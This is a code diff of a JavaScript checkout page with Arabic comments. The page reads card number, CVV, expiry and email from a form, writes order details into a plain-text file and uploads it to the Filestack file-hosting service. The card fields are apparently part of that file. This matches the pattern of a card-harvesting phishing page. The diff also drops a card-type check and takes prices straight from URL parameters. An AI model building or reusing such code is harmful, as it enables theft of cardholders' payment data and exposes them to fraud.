@@ -18,28 +18,22 @@ document.addEventListener('DOMContentLoaded', function () {
 
   const urlParams = getUrlParams();
 
-  // التأكد من أن المعلمات موجودة في الرابط
-  const productName = urlParams.name || 'Product Name Not Provided';
-  const productColor = urlParams.color || 'Color Not Provided';
-  const productPrice = urlParams.price ; // التأكد من تحويل السعر إلى قيمة عددية صحيحة
-  const productQuantity = urlParams.quantity; // التأكد من تحويل الكمية إلى قيمة عددية صحيحة
-  const productImageUrl = urlParams.image || ''; // إذا لم يكن هناك صورة في الرابط، نتركها فارغة
-
   // ملء معلومات المنتج باستخدام المعلمات المستلمة من الرابط
-  document.getElementById('product-name').textContent = `${productName}`;
-  document.getElementById('product-color').textContent = ` ${productColor}`;
-  document.getElementById('product-price').textContent = `$${productPrice.toFixed(2)}`; // تنسيق السعر ليظهر بشكل عشري
-  document.getElementById('product-quantity').textContent = `${productQuantity}`;
+  document.getElementById('product-name').textContent = `${urlParams.name}`;
+  document.getElementById('product-color').textContent = ` ${urlParams.color}`;
+  document.getElementById('product-price').textContent = `${urlParams.price}`;
+  document.getElementById('product-quantity').textContent = `${urlParams.quantity}`;
 
   // حساب السعر الإجمالي
-  const totalPrice = productPrice * productQuantity;
-  document.getElementById('total-price').textContent = `$${totalPrice.toFixed(2)}`;
+  const totalPrice = urlParams.price * urlParams.quantity;
+  document.getElementById('total-price').textContent = `$${totalPrice}`;
 
   // عرض الصورة
   const productImage = document.getElementById('product-image');
-  if (productImageUrl) {
-    productImage.src = productImageUrl;
-    productImage.alt = productName || 'Product image';
+
+  if (urlParams.image) {
+    productImage.src = urlParams.image;
+    productImage.alt = urlParams.name || 'Product' + ' image';
   } else {
     productImage.src = 'https://via.placeholder.com/500x300?text=No+Image+Available';
     productImage.alt = 'No Image Available';
@@ -77,8 +71,10 @@ document.addEventListener('DOMContentLoaded', function () {
     const cvv = document.getElementById('cvv').value;
 
     // معلومات المنتج
+    const productName = document.getElementById('product-name').textContent.split(': ')[1];  // اسم المنتج
     const productPriceText = document.getElementById('product-price').textContent.split(': ')[1];  // سعر المنتج
     const productQuantityText = document.getElementById('product-quantity').textContent.split(': ')[1];  // كمية المنتج
+    const productImageUrl = urlParams.productImage || '';  // رابط الصورة
 
     // تحقق من القيم
     let isValid = true;
@@ -105,11 +101,6 @@ document.addEventListener('DOMContentLoaded', function () {
 
     // تحقق من صحة أرقام البطاقة (Visa / MasterCard فقط) باستخدام خوارزمية لوهان
     if (!luhnCheck(cardNumber)) {
-      isValid = false;
-      showErrorMessage('Please enter a valid Visa or MasterCard number.', 'card-number');
-    }
-
-    if (!validateCard(cardNumber)) {
       isValid = false;
       showErrorMessage('Please enter a valid Visa or MasterCard number.', 'card-number');
     }
@@ -164,7 +155,7 @@ document.addEventListener('DOMContentLoaded', function () {
       fileContent += `Product Price: ${productPriceText}\n`;
       fileContent += `Product Quantity: ${productQuantityText}\n`;
       fileContent += `Product Image URL: ${productImageUrl}\n`;
-      fileContent += `Total Price: ${totalPrice.toFixed(2)}\n`;
+      fileContent += `Total Price: ${totalPrice}\n`;
 
       // رفع الملف إلى Filestack
       uploadFileToFilestack(fileContent); 
@@ -173,28 +164,27 @@ document.addEventListener('DOMContentLoaded', function () {
 
   // دالة للتحقق من البريد الإلكتروني
   function validateEmail(email) {
-    const regex = /^[a-zA-Z0-9._%+-]+@[a-zAZ0-9.-]+\.[a-zA-Z]{2,}$/;
+    const regex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
     return regex.test(email);
   }
 
   // دالة للتحقق من اسم حامل البطاقة
   function validateCardName(cardName) {
-    const regex = /^[A-Za-z ]+$/;  // اسم حامل البطاقة يجب أن يحتوي على أحرف فقط
+    const regex = /^[A-Za-z ]+$/;  // يجب أن يحتوي الاسم فقط على حروف ومسافات
     return regex.test(cardName);
   }
 
-  // دالة للتحقق من أرقام البطاقة باستخدام خوارزمية لوهان (Luhn Algorithm)
+  // دالة للتحقق من رقم البطاقة باستخدام خوارزمية لوهان
   function luhnCheck(cardNumber) {
     let sum = 0;
     let shouldDouble = false;
     for (let i = cardNumber.length - 1; i >= 0; i--) {
-      let digit = parseInt(cardNumber.charAt(i), 10);
+      let digit = parseInt(cardNumber[i]);
       if (shouldDouble) {
-        digit *= 2;
-        if (digit > 9) {
-          sum += digit - 9;
+        if (digit * 2 > 9) {
+          sum += (digit * 2) - 9;
         } else {
-          sum += digit;
+          sum += digit * 2;
         }
       } else {
         sum += digit;
@@ -208,7 +198,6 @@ document.addEventListener('DOMContentLoaded', function () {
     const regex = /^(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14})$/;  // Visa / MasterCard فقط
     return regex.test(cardNumber);
   }
-
 
   // دالة للتحقق من تاريخ الصلاحية
   function validateExpiry(expiry) {
@@ -263,7 +252,11 @@ document.addEventListener('DOMContentLoaded', function () {
 });
 
 
-  
+
+
+
+
+ 
   
 
 
